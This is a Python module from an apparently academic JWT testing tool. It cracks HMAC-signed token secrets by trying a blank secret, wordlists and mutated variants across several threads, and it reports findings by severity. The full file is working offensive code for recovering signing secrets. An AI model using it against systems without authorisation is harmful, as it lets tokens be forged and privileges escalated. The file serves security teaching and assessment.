"""
brute_force.py - HMAC secret brute-force attack

attempts to recover the signing secret of an HMAC-signed jwt 
via dictionary attack.

Attack order:
    1. blank secret ('')
    2. bundled common secrets (wordlists/common_secrets.txt)
    3. custom wordlist (if provided)
    4. mutated variants of all of the above

Author: Patrick Earley
Module: CMP320 Advanced Ethical Hacking
"""

import hmac
import hashlib
import base64
import os
from concurrent.futures import ThreadPoolExecutor, as_completed


# map jwt algorithm names to their hashlib equivalents
ALGO_MAP = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}

# path to the bundled common secrets list relative to this file
BUNDLED_WORDLIST = os.path.join(
    os.path.dirname(os.path.dirname(__file__)),
    'wordlists', 'common_secrets.txt'
)


# signature verification

def _verify(signing_input, signature_bytes, secret, hash_fn):
    """
    attempt to verify a jwt signature using a candidate secret.

    recomputes the HMAC signature using the signing input and
    candidate secret, then compares against the actual signature
    using hmac.compare_digest to prevent timing attacks. returns 
    true if the secret is correct, false if it's not.
    """
    try:
        candidate_sig = hmac.new(
            secret.encode('utf-8', errors='replace'),
            signing_input.encode('utf-8'),
            hash_fn
        ).digest()
        return hmac.compare_digest(candidate_sig, signature_bytes)
    except Exception:
        return False


# mutation engine

def _mutate(secret):
    """
    Generate common variations of a secret string.

    Arg in is the secret, and returns a list of unique variants 
    (excluding the original since that will already have been tested).
    """
    variants = set()

    # capitalisation variants
    variants.add(secret.lower())
    variants.add(secret.upper())
    variants.add(secret.capitalize())
    variants.add(secret.title())

    # common suffixes
    for suffix in ['1', '12', '123', '1234', '!', '@', '#', '123!', '2024', '2025']:
        variants.add(secret + suffix)
        variants.add(secret.capitalize() + suffix)

    # simple leet substitutions
    leet = secret.lower()
    for plain, sub in [('a', '@'), ('e', '3'), ('i', '1'), ('o', '0'), ('s', '$')]:
        leet = leet.replace(plain, sub)
    if leet != secret:
        variants.add(leet)

    # remove the original - it was already tested before mutation
    variants.discard(secret)

    return list(variants)


# wordlist loader

def _load_wordlist(path):
    """
    load secrets from a wordlist file, one per line.

    skips blank lines and lines starting with '#' (comments).
    
    Arg in is the path to the wordlist file, and returns an empty list 
    if the file doesn't exist or can't be read, instead of raising an 
    exception.
    """
    if not path or not os.path.isfile(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return [
                line.rstrip('\n\r')
                for line in f
                if line.strip() and not line.startswith('#')
            ]
    except Exception:
        return []


# worker function for threading

def _try_batch(batch, signing_input, signature_bytes, hash_fn, use_mutations):
    """
    try a batch of candidate secrets and return the first match.

    supposed to be run in a thread. iterates through the batch
    and for each secret tries the raw value, then mutations if
    enabled. returns the cracked secret string or None.
    """
    for secret in batch:
        if _verify(signing_input, signature_bytes, secret, hash_fn):
            return secret
        if use_mutations:
            for variant in _mutate(secret):
                if _verify(signing_input, signature_bytes, variant, hash_fn):
                    return variant
    return None


# main interface

def analyse(decoded, wordlist_path=None, threads=4, use_mutations=True):
    """
    attempt to brute-force the HMAC signing secret of a jwt.

    only runs against HMAC-signed tokens. skips gracefully for RSA/ECDSA 
    tokens with an informational finding explaining why.

    Args in are the output of decoder.decode(), optional path to a custom
    wordlist file, number of worker threads (defaults to 4), and whether
    or not to try mutated variants (defaults to True). returns a list of 
    finding dicts. if the secret is cracked, the finding includes a 
    'cracked_secret' field.
    """
    findings = []
    algorithm = decoded['algorithm']

    # only HMAC algorithms can be brute-forced offline
    if algorithm not in ALGO_MAP:
        findings.append({
            'severity': 'INFO',
            'title': f"Brute-force not applicable for {algorithm}",
            'description': (
                f"{algorithm} uses asymmetric cryptography. The signing key "
                f"is a private key that cannot be recovered by brute-force. "
                f"Consider the algorithm confusion attack instead."
            )
        })
        return findings

    hash_fn = ALGO_MAP[algorithm]
    signing_input = decoded['signing_input']
    signature_bytes = decoded['signature_bytes']

    # step 1 - blank secret
    if _verify(signing_input, signature_bytes, '', hash_fn):
        findings.append({
            'severity': 'CRITICAL',
            'title': "Secret is blank",
            'description': (
                "The token is signed with an empty string as the secret. "
                "This provides no security whatsoever — any attacker can "
                "forge arbitrary tokens trivially."
            ),
            'cracked_secret': ''
        })
        return findings

    # step 2 - build candidate list

    # always try the bundled common secrets first
    candidates = _load_wordlist(BUNDLED_WORDLIST)

    # append custom wordlist if provided
    if wordlist_path:
        custom = _load_wordlist(wordlist_path)
        if not custom:
            findings.append({
                'severity': 'INFO',
                'title': "Custom wordlist could not be loaded",
                'description': (
                    f"The wordlist at '{wordlist_path}' could not be read "
                    f"or was empty. Falling back to bundled secrets only."
                )
            })
        else:
            # deduplicate while preserving order
            seen = set(candidates)
            for c in custom:
                if c not in seen:
                    candidates.append(c)
                    seen.add(c)

    if not candidates:
        findings.append({
            'severity': 'INFO',
            'title': "No candidates to test",
            'description': "No wordlist was loaded and the bundled list is empty."
        })
        return findings

    # step 3 - threaded brute-force

    # split candidate list into equal batches for threading
    threads = max(1, threads)
    batch_size = max(1, len(candidates) // threads)
    batches = [
        candidates[i:i + batch_size]
        for i in range(0, len(candidates), batch_size)
    ]

    cracked = None

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                _try_batch, batch, signing_input,
                signature_bytes, hash_fn, use_mutations
            ): batch
            for batch in batches
        }

        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                cracked = result
                # cancel remaining futures
                for f in futures:
                    f.cancel()
                break

    # step 4 - report the result

    if cracked is not None:
        findings.append({
            'severity': 'CRITICAL',
            'title': "HMAC secret cracked",
            'description': (
                f"The signing secret was recovered from the wordlist. "
                f"An attacker with this secret can forge arbitrary tokens "
                f"with any claims they choose, including privilege escalation."
            ),
            'cracked_secret': cracked
        })
    else:
        findings.append({
            'severity': 'INFO',
            'title': "Secret not found in wordlist",
            'description': (
                f"Tested {len(candidates)} candidate secret(s) "
                f"({'with' if use_mutations else 'without'} mutations) "
                f"across {threads} thread(s). The secret was not recovered. "
                f"Try a larger wordlist or increase thread count."
            )
        })

    return findings